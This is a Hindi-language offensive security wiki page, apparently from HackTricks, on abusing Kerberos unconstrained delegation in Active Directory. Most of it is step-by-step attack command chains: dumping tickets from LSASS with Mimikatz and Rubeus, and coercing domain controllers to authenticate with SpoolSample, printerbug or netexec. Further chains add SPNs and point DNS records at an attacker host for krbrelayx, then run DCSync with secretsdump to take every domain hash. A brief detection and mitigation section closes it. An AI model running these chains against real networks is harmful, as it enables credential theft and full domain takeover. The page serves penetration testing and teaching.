# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

यह एक feature है जिसे Domain Administrator domain के किसी भी **Computer** पर सेट कर सकता है। इसके बाद, जब भी कोई **user उस Computer पर login करता है**, उस user के **TGT की एक copy DC द्वारा दिए गए TGS के अंदर भेजी जाएगी** और **LSASS में memory में save की जाएगी**। इसलिए, अगर आपके पास उस machine पर Administrator privileges हैं, तो आप **tickets dump करके users का impersonate** कर सकेंगे।

इसलिए, अगर कोई domain admin "Unconstrained Delegation" feature enabled वाले Computer पर login करता है और आपके पास उस machine पर local admin privileges हैं, तो आप ticket dump करके Domain Admin का कहीं भी impersonate कर सकेंगे (domain privesc)।

आप [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute में [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) मौजूद है या नहीं, यह जाँचकर इस attribute वाले Computer objects **ढूँढ सकते हैं**। आप यह काम ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filter से कर सकते हैं; powerview भी यही करता है:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Administrator (या victim user) का ticket, **Mimikatz** या [**Pass the Ticket**](pass-the-ticket.md)** के लिए Rubeus का उपयोग करके** memory में load करें।\
अधिक जानकारी: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**ired.team में Unconstrained delegation के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

यदि कोई attacker **"Unconstrained Delegation" के लिए अनुमत computer को compromise** करने में सक्षम है, तो वह **Print server को धोखा देकर** उससे उस computer पर **अपने आप login** करवा सकता है, जिससे server की memory में एक TGT **सहेजा जाता है**।\
इसके बाद, attacker user Print server computer account का **प्रतिरूपण करने के लिए Pass the Ticket attack** कर सकता है।

किसी print server को किसी भी machine पर login करवाने के लिए आप [**SpoolSample**](https://github.com/leechristensen/SpoolSample) का उपयोग कर सकते हैं:

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

यदि TGT किसी domain controller से है, तो आप [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) कर सकते हैं और DC से सभी hashes प्राप्त कर सकते हैं।\
[**इस attack के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

**authentication force** करने के अन्य तरीके यहाँ देखें:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

कोई भी अन्य coercion primitive जो victim को आपके unconstrained-delegation host से **Kerberos** के ज़रिए authenticate करवाता है, वह भी काम करेगा। आधुनिक environments में, इसका अक्सर मतलब होता है कि classic PrinterBug flow की जगह **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, या **WebClient/WebDAV**-आधारित coercion का इस्तेमाल करना—यह इस पर निर्भर करता है कि कौन-सा RPC surface पहुँच योग्य है।

### unconstrained delegation वाले user/service account का दुरुपयोग

Unconstrained delegation **केवल computer objects तक सीमित नहीं है**। किसी **user/service account** को भी `TRUSTED_FOR_DELEGATION` के रूप में configure किया जा सकता है। इस स्थिति में, व्यावहारिक आवश्यकता यह है कि account को अपने **SPN** के लिए Kerberos service tickets प्राप्त होने चाहिए।

इसके परिणामस्वरूप, हमले के 2 बहुत आम रास्ते बनते हैं:

1. आप unconstrained-delegation वाले **user account** का password/hash compromise करते हैं, फिर उसी account में **SPN जोड़ते हैं**।
2. Account में पहले से एक या अधिक SPN हैं, लेकिन उनमें से कोई **पुराने/decommission किए गए hostname** की ओर इंगित करता है; गुम **DNS A record** को फिर से बनाने से SPN set में बदलाव किए बिना authentication flow hijack करना पर्याप्त है।<sup>[[8]](#references)</sup>

न्यूनतम Linux flow:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

नोट्स:

- यह खास तौर पर तब उपयोगी है, जब unconstrained principal एक **service account** हो और आपके पास केवल उसके credentials हों, किसी joined host पर code execution न हो।
- अगर target user के पास पहले से **stale SPN** है, तो नया SPN AD में लिखने के बजाय उससे संबंधित **DNS record** फिर से बनाना कम noisy हो सकता है।
- हाल की Linux-केंद्रित tradecraft में `addspn.py`, `dnstool.py`, `krbrelayx.py` और एक coercion primitive का इस्तेमाल होता है; इस chain को पूरा करने के लिए आपको किसी Windows host को छूने की ज़रूरत नहीं है।

### attacker-created computer के साथ Unconstrained Delegation का दुरुपयोग

आधुनिक domains में अक्सर `MachineAccountQuota > 0` होता है (डिफ़ॉल्ट 10), जिससे कोई भी authenticated principal अधिकतम N computer objects बना सकता है। अगर आपके पास `SeEnableDelegationPrivilege` token privilege (या equivalent rights) भी है, तो आप नए बनाए गए computer को unconstrained delegation के लिए trusted सेट कर सकते हैं और privileged systems से आने वाले TGTs इकट्ठा कर सकते हैं।<sup>[[1]](#references)</sup>

उच्च-स्तरीय प्रक्रिया:

1) अपने नियंत्रण वाला computer बनाएँ

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) डोमेन के अंदर नकली hostname को resolve होने योग्य बनाएं

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) हमलावर के नियंत्रण वाले कंप्यूटर पर Unconstrained Delegation सक्षम करें

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

यह क्यों काम करता है: unconstrained delegation के साथ, delegation-enabled कंप्यूटर पर LSA आने वाले TGTs को cache करता है। यदि आप किसी DC या privileged server को अपने fake host से authenticate करने के लिए धोखा देते हैं, तो उसका machine TGT स्टोर हो जाएगा और export किया जा सकेगा।

4) krbrelayx को export mode में शुरू करें और Kerberos material तैयार करें

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) DC/servers से अपने नकली host पर authentication करवाएँ

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx किसी मशीन के authentication करने पर ccache files सेव करेगा, उदाहरण के लिए:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) कैप्चर किए गए DC machine TGT का उपयोग करके DCSync करें

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

नोट्स और आवश्यकताएँ:

- `MachineAccountQuota > 0` होने पर बिना विशेषाधिकार वाले उपयोगकर्ता कंप्यूटर बना सकते हैं; अन्यथा स्पष्ट अधिकारों की आवश्यकता होती है।
- किसी कंप्यूटर पर `TRUSTED_FOR_DELEGATION` सेट करने के लिए `SeEnableDelegationPrivilege` (या domain admin अधिकार) आवश्यक हैं।
- अपने fake host का name resolution (DNS A record) सुनिश्चित करें, ताकि DC उस तक FQDN से पहुँच सके।
- Coercion के लिए काम करने वाला vector आवश्यक है (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN आदि)। संभव हो तो DCs पर इन्हें disable करें।
- यदि victim account पर **"Account is sensitive and cannot be delegated"** सेट है या वह **Protected Users** का सदस्य है, तो forwarded TGT service ticket में शामिल नहीं होगा; इसलिए इस chain से reusable TGT नहीं मिलेगा।<sup>[[9]](#references)</sup>
- यदि authenticating client/server पर **Credential Guard** enabled है, तो Windows **Kerberos unconstrained delegation** को block करता है। इससे operator के दृष्टिकोण से अन्यथा मान्य coercion paths विफल हो सकते हैं।

Detection और hardening के सुझाव:

- Event ID 4741 (कंप्यूटर अकाउंट बनाया गया) और 4742/4738 (कंप्यूटर/यूज़र अकाउंट बदला गया) पर alert करें, जब UAC में `TRUSTED_FOR_DELEGATION` सेट हो।
- Domain zone में असामान्य DNS A-record additions की निगरानी करें।
- अनजान hosts से 4768/4769 में बढ़ोतरी और non-DC hosts पर DC-authentications पर नज़र रखें।
- `SeEnableDelegationPrivilege` को न्यूनतम आवश्यक लोगों तक सीमित करें, जहाँ संभव हो `MachineAccountQuota=0` सेट करें, और DCs पर Print Spooler disable करें। LDAP signing और channel binding लागू करें।

### Mitigation

- DA/Admin logins को विशिष्ट सेवाओं तक सीमित करें।
- Privileged accounts के लिए "Account is sensitive and cannot be delegated" सेट करें।

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync से DA तक](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – unrestricted delegation के ज़रिए domain compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Active Directory में Unconstrained Delegation](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – DC print server और Kerberos delegation के ज़रिए domain compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
